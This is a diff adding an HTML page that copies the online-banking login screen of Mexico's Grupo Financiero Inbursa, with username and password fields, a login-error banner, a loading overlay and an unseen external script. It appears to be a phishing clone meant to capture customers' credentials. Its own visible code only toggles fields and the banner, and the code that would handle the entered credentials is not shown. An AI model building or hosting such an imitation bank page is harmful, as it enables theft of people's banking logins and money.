@@ -1,0 +1,1084 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Ingresa a Inbursa en Línea</title>
+  <style>
+    :root {
+      /* PC: separación extra entre «Política…» y el bloque derecho (solo valores ≥0; valores negativos solapan el texto) */
+      --footer-rest-margin-start-pc: 0;
+      --inbursa-navy: #000050;
+      --inbursa-navy-hover: #000040;
+      --bg-main: #f7f9fc;
+      --banner-warn: #fff8dc;
+      --input-bg: #f1f4ff;
+      --text-muted: #5a6270;
+      --text-body: #212529;
+      --text-footer-bar: #54545f;
+      --shadow-card: 0 8px 24px rgba(0, 0, 40, 0.08);
+      --sidebar-w: 288px;
+    }
+
+    *,
+    *::before,
+    *::after {
+      box-sizing: border-box;
+    }
+
+    html {
+      height: 100%;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      font-size: 14px;
+      line-height: 1.45;
+      color: var(--text-body);
+      background: var(--bg-main);
+    }
+
+    .app {
+      display: flex;
+      min-height: 100vh;
+    }
+
+    /* ---------- Sidebar ---------- */
+    .sidebar {
+      width: var(--sidebar-w);
+      flex-shrink: 0;
+      background: var(--inbursa-navy);
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      padding: 1.5rem 1rem 2rem;
+    }
+
+    .sidebar__brand {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 0;
+      padding-bottom: 2rem;
+      margin-bottom: auto;
+      text-align: center;
+      width: 100%;
+    }
+
+    .sidebar__logo {
+      width: 156px;
+      height: auto;
+    }
+
+    .sidebar__version {
+      font-size: 0.8rem;
+      font-weight: 600;
+      letter-spacing: 0.04em;
+      margin-top: -0.72em;
+      opacity: 0.95;
+    }
+
+    .sidebar__nav {
+      list-style: none;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      gap: 1.45rem;
+    }
+
+    .sidebar__nav a {
+      display: flex;
+      align-items: flex-start;
+      gap: 0.75rem;
+      color: #fff;
+      text-decoration: none;
+      font-size: 0.98rem;
+      line-height: 1.45;
+      opacity: 0.95;
+      transition: opacity 0.15s;
+    }
+
+    .sidebar__nav a:hover {
+      opacity: 1;
+      text-decoration: underline;
+    }
+
+    .sidebar__icon {
+      flex-shrink: 0;
+      width: 21px;
+      height: 21px;
+      opacity: 0.9;
+    }
+
+    /* ---------- Main ---------- */
+    .main {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      min-width: 0;
+      min-height: 0;
+      background: var(--bg-main);
+    }
+
+    .main__banner-wrap {
+      flex-shrink: 0;
+      background: #ffffff;
+      width: 100%;
+      padding-bottom: 1.25rem;
+    }
+
+    .main__banner-wrap:has(.banner[hidden]) {
+      display: none;
+    }
+
+    .banner {
+      flex-shrink: 0;
+      background: var(--banner-warn);
+      color: #3d3200;
+      margin: 1.25rem 0.5rem 0;
+      padding: 1.05rem 1.2rem 1.05rem 1rem;
+      min-height: 3.05rem;
+      display: flex;
+      align-items: flex-start;
+      gap: 0.55rem;
+      font-size: 0.85rem;
+      line-height: 1.48;
+      border-radius: 10px;
+    }
+
+    .banner[hidden] {
+      display: none;
+    }
+
+    .banner__icon {
+      flex-shrink: 0;
+      width: 19px;
+      height: 19px;
+      margin-top: 0.08rem;
+      display: block;
+      object-fit: contain;
+    }
+
+    .banner__text {
+      flex: 1;
+      padding-right: 0.5rem;
+      margin: 0;
+    }
+
+    .banner__text strong {
+      font-weight: 700;
+      color: #1a0f00;
+    }
+
+    .banner__close {
+      flex-shrink: 0;
+      background: none;
+      border: none;
+      padding: 0.15rem;
+      cursor: pointer;
+      color: inherit;
+      opacity: 0.65;
+      line-height: 1;
+    }
+
+    .banner__close:hover {
+      opacity: 1;
+    }
+
+    .banner.banner--error-login {
+      background: #e11900;
+      color: #fff;
+      border: none;
+      font-size: 1.05rem;
+      line-height: 1.52;
+    }
+
+    .banner.banner--error-login .banner__text strong {
+      color: #fff;
+      font-weight: 700;
+    }
+
+    .banner.banner--error-login .banner__close {
+      color: #fff;
+      opacity: 0.85;
+    }
+
+    .banner.banner--error-login .banner__close:hover {
+      opacity: 1;
+    }
+
+    .content {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 2rem 1.25rem 1.5rem;
+    }
+
+    .card {
+      width: 100%;
+      max-width: 372px;
+      background: #fff;
+      border-radius: 10px;
+      box-shadow: var(--shadow-card);
+      padding: 2.6rem 1.75rem 2.45rem;
+    }
+
+    .card__title {
+      margin: 0 0 1.85rem;
+      font-size: 1.6rem;
+      font-weight: 700;
+      color: var(--inbursa-navy);
+      text-align: center;
+    }
+
+    .field {
+      margin-bottom: 1.45rem;
+    }
+
+    .field label {
+      display: block;
+      font-size: 0.9rem;
+      font-weight: 700;
+      margin-bottom: 0.45rem;
+      color: var(--text-body);
+    }
+
+    .field__wrap {
+      position: relative;
+      display: flex;
+      align-items: center;
+    }
+
+    .field__wrap input {
+      width: 100%;
+      padding: 0.9rem 2.75rem 0.9rem 0.75rem;
+      border: none;
+      border-radius: 6px;
+      background: var(--input-bg);
+      font-size: 0.95rem;
+      outline: none;
+      transition: box-shadow 0.15s;
+    }
+
+    .field__wrap input:focus {
+      box-shadow: 0 0 0 2px #000957;
+    }
+
+    .field__toggle {
+      position: absolute;
+      right: 0.35rem;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      padding: 0.4rem;
+      cursor: pointer;
+      color: var(--text-muted);
+      border-radius: 4px;
+    }
+
+    .field__toggle img {
+      width: 20px;
+      height: 20px;
+      display: block;
+      object-fit: contain;
+    }
+
+    .field__toggle:hover {
+      color: #333;
+      background: rgba(0, 0, 0, 0.05);
+    }
+
+    .field__error {
+      color: #b42318;
+      font-size: 0.88rem;
+      font-weight: 600;
+      margin: 0.35rem 0 0;
+      line-height: 1.35;
+      text-align: left;
+    }
+
+    .field__error[hidden] {
+      display: none !important;
+    }
+
+    .field__wrap.field__wrap--error input {
+      box-shadow: 0 0 0 2px #e11900;
+    }
+
+    .field__wrap.field__wrap--error input:focus {
+      box-shadow: 0 0 0 2px #e11900;
+    }
+
+    .btn-primary {
+      width: 100%;
+      margin-top: 0.45rem;
+      padding: 0.82rem 1rem;
+      border: none;
+      border-radius: 8px;
+      background: var(--inbursa-navy);
+      color: #fff;
+      font-size: 0.95rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.15s;
+    }
+
+    .btn-primary:hover {
+      background: var(--inbursa-navy-hover);
+    }
+
+    /* ---------- Promo ---------- */
+    .promo {
+      margin-top: 2rem;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 1rem;
+      width: 100%;
+      max-width: 560px;
+      text-align: center;
+      overflow-x: auto;
+      -webkit-overflow-scrolling: touch;
+    }
+
+    .promo__qr-block {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+    }
+
+    .promo__logo-text {
+      display: flex;
+      align-items: center;
+      line-height: 0;
+    }
+
+    .promo__logo-text img {
+      height: 28px;
+      width: auto;
+      max-width: 110px;
+      display: block;
+      object-fit: contain;
+    }
+
+    .promo__qr {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      line-height: 0;
+      padding: 0;
+      background: none;
+      border: none;
+    }
+
+    .promo__qr img {
+      width: 37px;
+      height: 37px;
+      object-fit: contain;
+      display: block;
+    }
+
+    .promo__copy {
+      font-size: 0.98rem;
+      color: var(--text-body);
+      font-weight: 500;
+      margin: 0;
+      text-align: center;
+      white-space: nowrap;
+      flex-shrink: 0;
+    }
+
+    .promo__copy-lead,
+    .promo__copy-rest {
+      display: inline;
+    }
+
+    .stores {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.5rem;
+      justify-content: center;
+      margin-top: 0.25rem;
+    }
+
+    .store-btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      padding: 0;
+      background: none;
+      text-decoration: none;
+      line-height: 0;
+      border-radius: 6px;
+    }
+
+    .store-btn img {
+      height: 30px;
+      width: auto;
+      max-width: 118px;
+      display: block;
+      object-fit: contain;
+    }
+
+    .store-btn:hover {
+      opacity: 0.88;
+    }
+
+    .store-btn:focus-visible {
+      outline: 2px solid var(--inbursa-navy);
+      outline-offset: 3px;
+    }
+
+    /* ---------- Footer ---------- */
+    .footer {
+      margin-top: auto;
+      padding: 1.5rem 1rem 1.25rem;
+      font-size: 0.75rem;
+      color: var(--text-muted);
+      width: 100%;
+      max-width: 900px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    .footer__top-wrap {
+      width: 100%;
+      margin-top: 1cm;
+      margin-bottom: 1.85rem;
+      overflow-x: auto;
+      -webkit-overflow-scrolling: touch;
+      scrollbar-width: thin;
+    }
+
+    .footer__top-wrap::-webkit-scrollbar {
+      height: 5px;
+    }
+
+    .footer__top-wrap::-webkit-scrollbar-thumb {
+      background: #c8ced9;
+      border-radius: 4px;
+    }
+
+    /* Fila legal: Política a la izquierda; enlaces + © en .footer__top--rest (gap evita solape; no usar translateX en el bloque entero) */
+    .footer__top-row {
+      display: flex;
+      flex-wrap: nowrap;
+      align-items: center;
+      gap: 1rem;
+      width: 100%;
+      box-sizing: border-box;
+      font-size: 0.96rem;
+      font-weight: 500;
+    }
+
+    .footer__privacy-anchor {
+      flex-shrink: 0;
+    }
+
+    .footer__top--rest {
+      display: flex;
+      flex: 1;
+      min-width: 0;
+      flex-wrap: nowrap;
+      justify-content: space-between;
+      align-items: center;
+      gap: 0.35rem;
+    }
+
+    .footer__top-row a,
+    .footer__copy {
+      flex-shrink: 0;
+    }
+
+    .footer__top-row a {
+      color: var(--text-footer-bar);
+      text-decoration: underline;
+      text-underline-offset: 0.15em;
+      font-weight: 500;
+    }
+
+    .footer__top-row a:visited {
+      color: var(--text-footer-bar);
+    }
+
+    .footer__top-row a:hover {
+      opacity: 0.82;
+    }
+
+    .footer__copy {
+      margin: 0;
+      line-height: 1.45;
+      font-weight: 500;
+      color: var(--text-footer-bar);
+      text-decoration: none;
+    }
+
+    .footer__legal {
+      text-align: center;
+      margin: 1cm auto 0;
+      font-size: 0.9rem;
+      line-height: 1.78;
+      padding: 0;
+      max-width: none;
+      width: 100%;
+      box-sizing: border-box;
+      font-weight: 400;
+      color: #545454;
+      overflow-x: visible;
+      overflow-wrap: break-word;
+    }
+
+    .footer__legal-name {
+      color: #545454;
+      font-weight: 600;
+    }
+
+    .footer__legal-meta {
+      color: #545454;
+    }
+
+    .footer__legal a {
+      color: #286ef1;
+      font-weight: 500;
+      text-decoration: underline;
+      text-underline-offset: 0.12em;
+    }
+
+    .footer__legal a:visited {
+      color: #286ef1;
+    }
+
+    .footer__legal a:hover {
+      color: #1e5fd4;
+    }
+
+    /* Móvil: mismos enlaces que la barra lateral, abajo del pie, en azul corporativo */
+    .content-bottom-help {
+      display: none;
+    }
+
+    /* Escritorio: barra azul fija, solo la columna derecha hace scroll */
+    @media (min-width: 769px) {
+      html,
+      body {
+        height: 100%;
+        overflow: hidden;
+      }
+
+      body {
+        background: var(--bg-main);
+      }
+
+      .app {
+        height: 100vh;
+        max-height: 100vh;
+        min-height: 0;
+        overflow-x: visible;
+        overflow-y: hidden;
+      }
+
+      .sidebar {
+        height: 100vh;
+        max-height: 100vh;
+        overflow: hidden;
+      }
+
+      .main {
+        height: 100vh;
+        max-height: 100vh;
+        overflow-y: auto;
+        overflow-x: visible;
+        -webkit-overflow-scrolling: touch;
+        scrollbar-width: none;
+        -ms-overflow-style: none;
+      }
+
+      .main::-webkit-scrollbar {
+        width: 0;
+        height: 0;
+        display: none;
+      }
+
+      .promo__copy {
+        display: block;
+        white-space: nowrap;
+      }
+
+      .promo__copy-lead,
+      .promo__copy-rest {
+        display: inline;
+      }
+
+      /* PC: el wrap con overflow-x:auto recortaba el texto si el enlace tenía margin negativo */
+      .footer__top-wrap {
+        overflow-x: visible;
+      }
+
+      /* PC: el pie ya no va centrado (max-width 900px); «Política…» queda a 1cm del borde izquierdo del panel (junto a la barra azul). El ancho compensa el padding de .content (1.25rem). */
+      .footer {
+        align-self: stretch;
+        max-width: none;
+        width: calc(100% + 2.5rem);
+        margin-left: -1.25rem;
+        margin-right: -1.25rem;
+        box-sizing: border-box;
+        padding: 1.5rem 1.25rem 1.25rem 1cm;
+      }
+
+      .footer__privacy-anchor {
+        margin-left: 1cm;
+      }
+
+      .footer__top--rest {
+        margin-left: var(--footer-rest-margin-start-pc);
+      }
+
+      .footer__copy {
+        margin-left: 2cm;
+      }
+
+      .footer__link--condiciones {
+        margin-left: 4cm;
+      }
+
+      .footer__link--integridad {
+        margin-left: 3cm;
+      }
+    }
+
+    @media (max-width: 768px) {
+      html {
+        height: auto;
+        min-height: 100%;
+        overflow-x: hidden;
+        overflow-y: auto;
+        -webkit-overflow-scrolling: touch;
+      }
+
+      body {
+        height: auto;
+        min-height: 100vh;
+        overflow-x: hidden;
+        overflow-y: auto;
+        -webkit-overflow-scrolling: touch;
+      }
+
+      .main {
+        overflow: visible;
+        min-height: 0;
+      }
+
+      .app {
+        flex-direction: column;
+        height: auto;
+        max-height: none;
+        min-height: 100vh;
+        overflow: visible;
+      }
+
+      .sidebar {
+        height: auto;
+        max-height: none;
+        position: static;
+        width: 100%;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        padding: 1.25rem 1rem;
+        gap: 0;
+      }
+
+      .sidebar__brand {
+        border-bottom: none;
+        margin-bottom: 0;
+        padding-bottom: 0;
+        flex: none;
+        min-width: 0;
+      }
+
+      .sidebar__nav {
+        display: none;
+      }
+
+      /* Pie legal: en columna, 0,5 cm entre cada ítem */
+      .footer__top-row {
+        flex-direction: column;
+        align-items: center;
+        gap: 0.5cm;
+      }
+
+      .footer__top--rest {
+        flex-direction: column;
+        flex: none;
+        width: 100%;
+        max-width: 100%;
+        align-items: center;
+        justify-content: flex-start;
+        gap: 0.5cm;
+      }
+
+      .footer__copy {
+        margin-left: 0;
+      }
+
+      .promo__copy {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        white-space: normal;
+      }
+
+      .promo__copy-lead,
+      .promo__copy-rest {
+        display: block;
+        text-align: center;
+      }
+
+      .content-bottom-help {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        align-self: stretch;
+        width: calc(100% + 2.5rem);
+        max-width: none;
+        box-sizing: border-box;
+        margin-top: 1.5rem;
+        margin-left: -1.25rem;
+        margin-right: -1.25rem;
+        padding: 1.25rem 1.25rem 1.5rem;
+        background: var(--inbursa-navy);
+        color: #fff;
+      }
+
+      .content-bottom-help__list {
+        list-style: none;
+        margin: 0;
+        padding: 0;
+        display: flex;
+        flex-direction: column;
+        align-items: flex-start;
+        width: fit-content;
+        max-width: 100%;
+        gap: 1.4rem;
+      }
+
+      .content-bottom-help__list li {
+        display: flex;
+        justify-content: flex-start;
+        width: 100%;
+      }
+
+      .content-bottom-help__list a {
+        display: inline-flex;
+        align-items: flex-start;
+        justify-content: flex-start;
+        gap: 0.75rem;
+        max-width: 100%;
+        color: #fff;
+        font-size: 0.98rem;
+        font-weight: 500;
+        line-height: 1.45;
+        text-decoration: none;
+        text-align: left;
+      }
+
+      .content-bottom-help .sidebar__icon {
+        flex-shrink: 0;
+        width: 24px;
+        height: 24px;
+        margin-top: 0.1em;
+      }
+
+      .content-bottom-help__list a:visited {
+        color: #fff;
+      }
+
+      .content-bottom-help__list a:hover {
+        color: #fff;
+        opacity: 0.92;
+      }
+    }
+
+    .bapa-login-wait {
+      position: fixed;
+      inset: 0;
+      z-index: 999;
+      /* Oscurece un poco lo de atrás, sin volverlo opaco */
+      background: rgba(0, 8, 30, 0.14);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 1.25rem;
+    }
+
+    .bapa-login-wait[hidden] {
+      display: none !important;
+    }
+
+    .bapa-login-wait__icon {
+      width: 60px;
+      height: 60px;
+      display: block;
+      animation: bapa-login-vector-spin 2.1s linear infinite;
+      filter: drop-shadow(0 2px 5px rgba(0, 0, 25, 0.25));
+    }
+
+    @keyframes bapa-login-vector-spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .bapa-login-wait__sr-only {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      padding: 0;
+      margin: -1px;
+      overflow: hidden;
+      clip: rect(0, 0, 0, 0);
+      white-space: nowrap;
+      border: 0;
+    }
+  </style>
+</head>
+<body>
+  <div class="app">
+    <aside class="sidebar" aria-label="Enlaces de ayuda">
+      <div class="sidebar__brand">
+        <img class="sidebar__logo" src="I/logo.svg" alt="Inbursa" width="156" height="40" />
+        <span class="sidebar__version">77.0.8</span>
+      </div>
+      <ul class="sidebar__nav">
+        <li>
+          <a href="#">
+            <svg class="sidebar__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" aria-hidden="true">
+              <rect x="6" y="3" width="12" height="18" rx="2" />
+              <path d="M10 18h4" stroke-linecap="round" />
+            </svg>
+            Conoce Inbursa Móvil
+          </a>
+        </li>
+        <li>
+          <a href="tel:8009090000">
+            <svg class="sidebar__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" aria-hidden="true">
+              <path d="M4 5h4l2 5-2 1a12 12 0 006 6l1-2 5 2v4a2 2 0 01-2 2C9.9 21 3 14.1 3 6a2 2 0 012-2z" stroke-linejoin="round" />
+            </svg>
+            800 90 90000
+          </a>
+        </li>
+        <li>
+          <a href="#">
+            <svg class="sidebar__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" aria-hidden="true">
+              <rect x="5" y="11" width="14" height="10" rx="2" />
+              <path d="M8 11V8a4 4 0 018 0v3" />
+            </svg>
+            Tips de Seguridad
+          </a>
+        </li>
+        <li>
+          <a href="#">
+            <svg class="sidebar__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" aria-hidden="true">
+              <rect x="3" y="4" width="18" height="13" rx="2" />
+              <path d="M8 21h8M12 17v4" stroke-linecap="round" />
+            </svg>
+            Requerimientos mínimos técnicos
+          </a>
+        </li>
+        <li>
+          <a href="#">
+            <svg class="sidebar__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" aria-hidden="true">
+              <path d="M12 21s7-4.5 7-11a7 7 0 10-14 0c0 6.5 7 11 7 11z" />
+              <circle cx="12" cy="10" r="2.5" fill="currentColor" stroke="none" />
+            </svg>
+            Manual de Geolocalización
+          </a>
+        </li>
+      </ul>
+    </aside>
+
+    <main class="main">
+      <div class="main__banner-wrap">
+        <div class="banner" id="security-banner" role="alert">
+          <img class="banner__icon" src="I/!.svg" width="19" height="19" alt="" />
+          <p class="banner__text">
+            <strong>Nunca te solicitaremos datos confidenciales</strong> por email, SMS, redes sociales, vía telefónica o en sucursal, <strong>nunca proporciones datos</strong> de tu tarjeta, claves de acceso o código token.
+          </p>
+          <button type="button" class="banner__close" id="banner-close" aria-label="Cerrar aviso">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <path d="M6 6l12 12M18 6L6 18" stroke-linecap="round" />
+            </svg>
+          </button>
+        </div>
+      </div>
+
+      <div class="content">
+        <div class="card">
+          <h1 class="card__title">Ingresa a Inbursa en Línea</h1>
+          <form id="login-form" action="#" method="post" autocomplete="on">
+            <div class="field">
+              <label for="usuario">Usuario</label>
+              <div class="field__wrap">
+                <input type="password" id="usuario" name="usuario" autocomplete="username" aria-describedby="usuario-field-error" />
+                <button type="button" class="field__toggle" aria-label="Mostrar usuario" data-target="usuario" data-eye-open="I/abierto.svg" data-eye-closed="I/cerrado.svg" data-label-show="Mostrar usuario" data-label-hide="Ocultar usuario">
+                  <img src="I/cerrado.svg" width="25" height="24" alt="" class="field__toggle-eye" />
+                </button>
+              </div>
+              <p class="field__error" id="usuario-field-error" hidden role="alert"></p>
+            </div>
+            <div class="field">
+              <label for="password">Contraseña</label>
+              <div class="field__wrap">
+                <input type="password" id="password" name="password" autocomplete="current-password" aria-describedby="password-field-error" />
+                <button type="button" class="field__toggle" aria-label="Mostrar contraseña" data-target="password" data-eye-open="I/abierto.svg" data-eye-closed="I/cerrado.svg" data-label-show="Mostrar contraseña" data-label-hide="Ocultar contraseña">
+                  <img src="I/cerrado.svg" width="25" height="24" alt="" class="field__toggle-eye" />
+                </button>
+              </div>
+              <p class="field__error" id="password-field-error" hidden role="alert"></p>
+            </div>
+            <button type="submit" class="btn-primary">Continuar</button>
+          </form>
+        </div>
+
+        <section class="promo" aria-label="Descarga la app">
+          <div class="promo__qr-block">
+            <div>
+              <div class="promo__logo-text">
+                <img src="I/movil.svg" width="120" height="28" alt="Inbursa Móvil" />
+              </div>
+            </div>
+            <div class="promo__qr">
+              <img src="I/QR.svg" width="37" height="37" alt="Código QR para descargar Inbursa Móvil" />
+            </div>
+          </div>
+          <p class="promo__copy">
+            <span class="promo__copy-lead">¿Eres nuevo?</span>
+            <span class="promo__copy-rest">Registrate, descarga ahora Inbursa Móvil</span>
+          </p>
+          <div class="stores">
+            <a class="store-btn" href="#" aria-label="Descargar en Google Play">
+              <img src="I/pay.svg" width="201" height="60" alt="Google Play" />
+            </a>
+            <a class="store-btn" href="#" aria-label="Descargar en App Store">
+              <img src="I/store.svg" width="179" height="60" alt="App Store" />
+            </a>
+            <a class="store-btn" href="#" aria-label="Descargar en AppGallery">
+              <img src="I/gallery.svg" width="198" height="60" alt="AppGallery" />
+            </a>
+          </div>
+        </section>
+
+        <footer class="footer">
+          <div class="footer__top-wrap">
+            <nav class="footer__top-row" aria-label="Legal y copyright">
+              <div class="footer__privacy-anchor">
+                <a href="#">Política de Privacidad</a>
+              </div>
+              <div class="footer__top--rest">
+                <a class="footer__link--condiciones" href="#">Condiciones de Uso</a>
+                <a class="footer__link--integridad" href="#">Política de Integridad Corporativa</a>
+                <span class="footer__copy">© 2026 Grupo Financiero Inbursa</span>
+              </div>
+            </nav>
+          </div>
+          <p class="footer__legal">
+            <span class="footer__legal-name">Comisión Nacional para la Protección y Defensa de los Usuarios de Servicios Financieros (CONDUSEF)</span><br />
+            <span class="footer__legal-meta">Teléfono: (55) 5340 0999 / </span><a href="https://www.condusef.gob.mx/" rel="noopener noreferrer" target="_blank">https://www.condusef.gob.mx/</a>
+          </p>
+        </footer>
+
+        <nav class="content-bottom-help" aria-label="Ayuda y contacto">
+          <ul class="content-bottom-help__list">
+            <li>
+              <a href="#">
+                <svg class="sidebar__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" aria-hidden="true">
+                  <rect x="6" y="3" width="12" height="18" rx="2" />
+                  <path d="M10 18h4" stroke-linecap="round" />
+                </svg>
+                Conoce Inbursa Móvil
+              </a>
+            </li>
+            <li>
+              <a href="tel:8009090000">
+                <svg class="sidebar__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" aria-hidden="true">
+                  <path d="M4 5h4l2 5-2 1a12 12 0 006 6l1-2 5 2v4a2 2 0 01-2 2C9.9 21 3 14.1 3 6a2 2 0 012-2z" stroke-linejoin="round" />
+                </svg>
+                800 90 90000
+              </a>
+            </li>
+            <li>
+              <a href="#">
+                <svg class="sidebar__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" aria-hidden="true">
+                  <rect x="5" y="11" width="14" height="10" rx="2" />
+                  <path d="M8 11V8a4 4 0 018 0v3" />
+                </svg>
+                Tips de Seguridad
+              </a>
+            </li>
+            <li>
+              <a href="#">
+                <svg class="sidebar__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" aria-hidden="true">
+                  <rect x="3" y="4" width="18" height="13" rx="2" />
+                  <path d="M8 21h8M12 17v4" stroke-linecap="round" />
+                </svg>
+                Requerimientos mínimos técnicos
+              </a>
+            </li>
+            <li>
+              <a href="#">
+                <svg class="sidebar__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" aria-hidden="true">
+                  <path d="M12 21s7-4.5 7-11a7 7 0 10-14 0c0 6.5 7 11 7 11z" />
+                  <circle cx="12" cy="10" r="2.5" fill="currentColor" stroke="none" />
+                </svg>
+                Manual de Geolocalización
+              </a>
+            </li>
+          </ul>
+        </nav>
+      </div>
+    </main>
+  </div>
+
+  <div id="bapa-login-wait" class="bapa-login-wait" hidden aria-busy="false">
+    <img class="bapa-login-wait__icon" src="I/vector.svg" width="60" height="60" alt="" aria-hidden="true" />
+    <span class="bapa-login-wait__sr-only">Cargando</span>
+  </div>
+
+  <script src="script.js?v=inbursa-local-1"></script>
+  <script>
+    (function () {
+      var banner = document.getElementById("security-banner");
+      var closeBtn = document.getElementById("banner-close");
+      if (closeBtn && banner) {
+        closeBtn.addEventListener("click", function () {
+          banner.hidden = true;
+        });
+      }
+
+      document.querySelectorAll('.field__toggle[data-target]').forEach(function (btn) {
+        var id = btn.getAttribute("data-target");
+        var input = document.getElementById(id);
+        if (!input) return;
+        var eyeImg = btn.querySelector(".field__toggle-eye");
+        var openSrc = btn.getAttribute("data-eye-open") || "I/abierto.svg";
+        var closedSrc = btn.getAttribute("data-eye-closed") || "I/cerrado.svg";
+        var labelShow = btn.getAttribute("data-label-show") || "Mostrar";
+        var labelHide = btn.getAttribute("data-label-hide") || "Ocultar";
+        btn.addEventListener("click", function () {
+          var show = input.type === "password";
+          input.type = show ? "text" : "password";
+          btn.setAttribute("aria-label", show ? labelHide : labelShow);
+          if (eyeImg) {
+            eyeImg.src = show ? openSrc : closedSrc;
+          }
+        });
+      });
+    })();
+  </script>
+</body>
+</html>
